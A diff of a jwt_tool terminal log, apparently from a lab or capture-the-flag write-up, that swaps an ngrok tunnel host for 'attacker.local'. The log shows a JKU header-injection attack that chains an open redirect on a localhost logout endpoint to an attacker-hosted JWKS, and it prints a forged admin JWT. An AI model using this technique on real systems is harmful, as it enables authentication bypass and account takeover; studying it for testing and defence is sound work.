@@ -79,10 +79,10 @@ Please enter new value and hit ENTER
 Please select a field number:                                                                                      
 (or 0 to Continue)                                                                                                 
 > 0
-Paste this JWKS into a file at the following location before submitting token request: http://127.0.0.1:1337/logout?returnTo=http://0.tcp.eu.ngrok.io:19067/jwks.json                                                                 
+Paste this JWKS into a file at the following location before submitting token request: http://127.0.0.1:1337/logout?returnTo=http://attacker.local/jwks.json                                                                 
 (JWKS file used: /home/kali/.jwt_tool/jwttool_custom_jwks.json)                                                    
 /home/kali/.jwt_tool/jwttool_custom_jwks.json                                                                      
-jwttool_fa2803d6e8b0b92701a6afb967893f2d - Signed with JWKS at http://127.0.0.1:1337/logout?returnTo=http://0.tcp.eu.ngrok.io:19067/jwks.json                                                                                         
+jwttool_fa2803d6e8b0b92701a6afb967893f2d - Signed with JWKS at http://127.0.0.1:1337/logout?returnTo=http://attacker.local/jwks.json                                                                                         
 [+] eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Imp3dF90b29sIiwiamt1IjoiaHR0cDovLzEyNy4wLjAuMToxMzM3L2xvZ291dD9yZXR1cm5Ubz1odHRwOi8vMC50Y3AuZXUubmdyb2suaW86MTkwNjcvandrcy5qc29uIn0.eyJ1c2VyIjp7InVzZXJuYW1lIjoiYWRtaW4iLCJpc19hZG1pbiI6MH0sImlhdCI6MTcxODk3MjU0NX0.o6UXO7ldJgZJpkJKcsPcrFDzHzSBgsfQmcx6OJns2Ax1WcOhBv8hRd5YPBKbxcNY4PikpR2wvpa9rVX2g4Jkjpzzv7hgT9YN_eAVL84aFxkink6eqcEV4daw__oOBYOlATNd4oLmOD-lI0GdjvVA4Cqwcmo48WoTVWmwyvHcDkKUtllHhYMLMuQFmVfoPzHLiKb71yGZ3kPz-U0rgTQo7-n4HOncjmkfRl5d18maQkZ2hUUVu6H4OBAr9qh0C9INVD99rcjTE9SVWbSL4E4GtQy-rcwWgKB3DHvX3dtVFQbp49ajZ6SWJbwY-CXRe8LRcI9tcAU6JvmZ9vC_HK-uLg                                                                                        
                                                                                                                    
 ┌──(kali㉿kali)-[~/jwt_tool]
